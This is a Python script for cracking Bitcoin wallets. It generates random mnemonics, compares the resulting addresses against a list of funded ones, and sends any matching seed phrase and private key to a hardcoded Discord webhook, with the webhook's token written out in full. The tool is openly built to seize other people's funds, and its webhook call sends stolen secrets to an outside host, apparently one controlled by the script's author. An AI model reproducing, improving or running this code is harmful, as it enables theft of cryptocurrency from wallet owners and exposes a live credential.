import requests
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hdwallet.utils import generate_mnemonic
from multiprocessing import Pool
import multiprocessing
from datetime import datetime
from colorama import Fore , Style , Back

def message(title, message):
    embered = {'title': message}
    headers = {"Content-Type": "application/json"}
    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title),
            'embeds': [embered]}
    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
    requests.post(webhook_url, json=data, headers=headers)

def timer():
    tcx = datetime.now().time()
    return tcx

r = 1
cores = 16

print(f"Start With: {cores} CPU Threads \n")

# Load file
# wget https://github.com/Pymmdrza/Rich-Address-Wallet/releases/download/Bitcoin-Addr_Sep-2023/Just_All_P2PKH_Bitcoin_Addresses.txt.zip
filename = 'Just_All_P2PKH_Bitcoin_Addresses.txt'
with open(filename) as f:
    addresses = set(f.read().split())
print(f"Loaded {len(addresses)} addresses!")

def generate_wallets():
    # wallets = []
    seed = generate_mnemonic()
    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
    hdwallet.from_mnemonic(mnemonic=seed)
    priv = hdwallet.private_key()
    addr = hdwallet.p2pkh_address()
    return {"address": addr, "seed": seed, "private_key": priv}

def get_balance(address):
    try:
        url = f"https://bitcoin.atomicwallet.io/api/v2/address/{address}"
        response = requests.get(url)
        data = response.json()
        balance = int(data.get('balance')) / 100000000
        return balance
    except Exception as error:
        print('Error: ', error)
        return -1

def seek(i):
    z = 0
    w = 0

    while True:
        z += 1
        txx = timer()
        ck = generate_wallets()
        address = ck.get('address')
        seed = ck.get('seed')
        private_key = ck.get('private_key')

        if(address in addresses):
            w += 1
            balance = get_balance(address)
            print(Fore.GREEN, f"[CPU{i}][C: {z} / W: {w}] | {address} | {seed} | {balance} BTC")
            message('NEW BTC WALLET IS FOUND!', f"[{balance} BTC] \n Address: [{address}] \n Seed: [{seed}] \n Private: [{private_key}]")
            print(Fore.WHITE, 'Winning Wallet On Database File Imported ... [LOADED]')
            print(Fore.CYAN, 'All Details Saved On Text File Root Path ... [WRITED]')
            f = open("winner.txt", "a")
            f.write('\n' + str(address))
            f.write('\n' + str(seed))
            f.write('\n' + str(private_key))
            f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
            f.close()
            print(Fore.MAGENTA, 'Information File Name ========> winner.txt [OK]')
            continue
        else:
            print(Fore.RED, f"[CPU{i}][C: {z} / W: {w}]", Fore.BLUE , f" | {address} | {seed}")

if __name__ == '__main__':
    for i in range(cores):
        p = multiprocessing.Process(target=seek, args=(i,))
        p.start()
